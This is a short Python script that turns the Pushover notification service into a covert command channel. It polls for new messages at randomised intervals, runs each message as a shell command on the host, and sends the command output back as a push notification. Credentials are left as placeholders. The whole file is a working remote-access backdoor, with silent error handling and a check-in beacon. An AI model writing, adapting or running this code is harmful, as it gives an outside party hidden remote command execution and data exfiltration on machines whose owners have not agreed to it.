import requests
import subprocess
import json
from random import randint
from time import sleep

device = "Device to send pnotification to"
userkey = "USer Key"
ptoken = "INSERT TOKEN"
msg = ""
id = "INSERT ID HERE"
secret = "INSERT SECRET HERE"
getp = "https://api.pushover.net/1/messages.json?secret="+secret+"&device_id="+id
delp = "https://api.pushover.net/1/devices/"+id+"/update_highest_message.json"
delay = randint(10,40)
b = randint(1,1000)
def getmsg():
	try:
		r = requests.get(getp)
		r1 = r.json()
		r2 = r1['messages'][0]['message'];r3 = r1['messages'][0]['id']
		process=subprocess.Popen(r2.split(),stdout=subprocess.PIPE);output,error=process.communicate();payload1=bytes(output.strip())
		if payload1:
			data1 = { "secret": secret, "message": r3 }
			rd = requests.post(delp, data = data1)
			sp(payload1)
	except:
		a = ''
def sp(msg):
	data = { "token": ptoken, "user": userkey, "message": msg , "device": device}
	try:
		r = requests.post("https://api.pushover.net/1/messages.json", data = data)
	except Exception as e:
		print(e)

if __name__ == "__main__":
	sp(b)
	while True:
		getmsg()
		sleep(delay)
